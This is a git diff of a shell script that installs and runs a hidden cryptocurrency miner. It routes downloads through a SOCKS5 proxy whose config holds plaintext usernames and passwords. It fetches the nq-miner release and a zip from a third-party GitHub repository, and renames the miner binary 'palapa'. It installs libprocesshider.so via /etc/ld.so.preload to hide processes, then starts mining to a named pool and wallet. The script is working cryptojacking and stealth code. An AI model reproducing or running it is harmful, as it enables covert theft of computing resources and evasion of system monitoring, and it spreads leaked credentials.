@@ -14,9 +14,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = us-east-static-08.quotaguard.com:1080
-socks5_username = wqcxq2tpp4phsh
-socks5_password = ss0ruta1t5dtpoe1x106hu3y7obk
+socks5 = us-east-static-03.quotaguard.com:1080
+socks5_username = m1orro4i3z62xo
+socks5_password = vdx9fz1txauwwfs4407a3zirgr8t9
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -41,9 +41,9 @@ echo " "
 
 echo " "
 
-./graftcp/graftcp wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz
+./graftcp/graftcp wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-0.99.7.tar.gz
 
-tar -xhf xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz
+tar -xhf nq-miner-0.99.7.tar.gz && cd nq-miner && mv nq-miner palapa
 
 ./graftcp/graftcp wget https://github.com/komaria10003099/wappahj/raw/main/magicBezzHash.zip
 
@@ -57,6 +57,4 @@ mv libprocesshider.so /usr/local/lib/
 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-cd miner
-
-./graftcp/graftcp ./xmrigDaemon -o 137.184.5.123:443 -t$(nproc --all)
+./graftcp/graftcp ./palapa -t cuda -a "NQ25 N9TY UQ03 RD9K 7EBL 1LLA GUR8 MYBY 6JG1" -p pool.acemining.co:8443 --threads 1 --cache 1 --cpu-priority 0
